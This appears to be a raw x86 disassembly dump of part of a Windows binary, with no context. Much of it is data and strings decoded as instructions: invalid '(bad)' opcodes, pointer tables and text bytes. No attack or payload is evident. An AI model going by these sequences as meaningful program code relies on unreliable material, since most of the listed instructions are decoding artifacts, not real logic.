  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	sbb    esp,DWORD PTR [edx-0x1b234555]
  43395e:	popa   
  43395f:	dec    esi
  433960:	xchg   ecx,eax
  433961:	outs   dx,DWORD PTR ds:[esi]
  433962:	adc    BYTE PTR [edx-0x3c11cec4],ch
  433968:	sbb    eax,DWORD PTR [eax]
  43396a:	add    BYTE PTR [eax],al
  43396c:	push   esp
  43396d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433971:	addr16 push edi
  433973:	bound  bx,DWORD PTR [edx+0x45]
  433977:	outs   dx,BYTE PTR ds:[esi]
  433978:	pop    esp
  433979:	je     0x4339ee
  43397b:	ja     0x4339be
  43397d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433985:	js     0x4339f6
  433987:	jp     0x4339f8
  433989:	jns    0x4339ef
  43398b:	jp     0x4339f5
  43398d:	je     0x4339f3
  43398f:	jp     0x4339f3
  433991:	cs jo  0x4339f8
  433994:	bound  eax,QWORD PTR [eax]
	...
